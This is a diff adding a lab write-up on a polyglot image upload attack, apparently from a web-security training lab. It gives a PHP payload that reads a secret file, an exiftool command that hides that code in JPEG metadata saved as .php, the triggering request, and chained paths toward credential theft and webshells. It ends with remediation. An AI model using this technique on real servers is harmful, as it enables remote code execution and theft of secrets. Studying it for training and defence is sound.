@@ -1214,3 +1214,204 @@ shell%252Ephp
 
 
 ---
+
+# ✅Lab-6 File Upload Vulnerabilities – Flawed Validation of File Contents (Polyglot Attack)
+
+---
+
+## 1. Overview
+
+File upload vulnerabilities occur when a web application allows users to upload files that are later processed or executed by the server.
+
+In this lab, the application validates **file contents** instead of relying only on file extension or MIME type.  
+Although this is stronger than basic validation, it is still **bypassable**.
+
+The server:
+- Confirms the uploaded file is a valid image
+- Later executes it as PHP
+
+This results in **Remote Code Execution (RCE)** using a **polyglot file**.
+
+---
+
+## 2. What Is This Topic About?
+
+**Core concept:**
+
+> Content-based validation is not enough if execution is based on file extension.
+
+The application:
+- Checks magic bytes (JPEG headers)
+- Accepts the upload if the file looks like a real image
+
+However:
+- The web server executes files based on extension
+- Image metadata is not sanitized
+- PHP code hidden inside metadata is executed
+
+This mismatch creates the vulnerability.
+
+---
+
+## 3. Real-World Scenarios
+
+### Scenario 1 – Avatar Upload → Full Server Takeover
+- Profile picture upload allowed
+- Polyglot image contains PHP payload
+- Stored in web-accessible directory
+- Triggered via direct GET request
+
+**Impact:** Remote Code Execution
+
+---
+
+### Scenario 2 – CMS Media Upload Abuse
+- CMS validates image content
+- PHP payload embedded in EXIF metadata
+- File saved as `.php`
+- Admin views the image
+
+**Impact:** Persistent backdoor
+
+---
+
+### Scenario 3 – Bug Bounty Critical Finding
+- App claims secure image validation
+- Execution depends on extension
+- Metadata not stripped
+
+**Impact:** Critical severity report
+
+---
+
+### Scenario 4 – Cloud Credential Theft
+- Polyglot executes PHP
+- Reads `.env` file
+- Extracts cloud credentials
+
+**Impact:** Cloud compromise
+
+---
+
+### Scenario 5 – Stealthy Persistence
+- Polyglot uploaded once
+- Appears as harmless image
+- Long-term hidden access
+
+**Impact:** Persistent RCE
+
+---
+
+## 4. Lab Walkthrough
+
+### Step 1 – Prepare PHP Payload
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+---
+
+### Step 2 – Normal Upload Attempt
+
+- Upload a standard `.php` file
+- Upload is rejected due to content validation
+
+---
+
+### Step 3 – Create Polyglot Image (Key Step)
+
+Using ExifTool:
+
+```bash
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" cat.jpg -o polyglot.php
+```
+
+This creates:
+- A valid JPEG image
+- PHP code hidden inside metadata
+- Saved with `.php` extension
+
+---
+
+### Step 4 – Upload Polyglot File
+
+- Upload `polyglot.php`
+- Server accepts it as a valid image
+- File stored in `/files/avatars/`
+
+---
+
+### Step 5 – Trigger Execution
+
+```http
+GET /files/avatars/polyglot.php HTTP/1.1
+```
+
+- PHP executes
+- Carlos secret is revealed
+
+---
+
+## 5. Evidence
+
+### Screenshot 1 – Successful Polyglot Upload
+
+![Successful Polyglot Upload](../images/polyglot-upload-success.png)
+
+---
+
+### Screenshot 2 – Carlos Secret Revealed via polyglot.php
+
+![ Secret Revealed via polyglot.php
+](../images/polyglot-carlos-secret.png)
+
+---
+
+## 6. High-Value Endpoints
+
+- /upload
+- /avatar
+- /profile-picture
+- /media
+- /files
+- /images
+- /assets
+- /api/upload
+- /admin/upload
+
+---
+
+## 7. Multi-Chain Attack Possibilities
+
+- File Upload → Polyglot → RCE → Read `.env` → DB takeover
+- File Upload → RCE → SSH key extraction → Lateral movement
+- File Upload → RCE → Cloud credentials → Cloud takeover
+- File Upload → RCE → Webshell → Persistence
+
+---
+
+## 8. Remediation
+
+- Disable execution in upload directories
+- Rename uploaded files server-side
+- Strip metadata from images
+- Validate content, extension, and MIME consistently
+- Store uploads outside web root
+- Serve uploads from a separate domain
+- Use strict allowlists
+
+---
+
+## 9. Extra Notes / Tips
+
+- Content validation ≠ execution safety
+- Metadata is often ignored
+- Polyglots bypass “secure” upload logic
+- If `.php` executes → full compromise
+
+---
+
+## 10. One-Line Takeaway
+
+> Even strong content-based validation can be bypassed using polyglot files if execution depends on file extension.
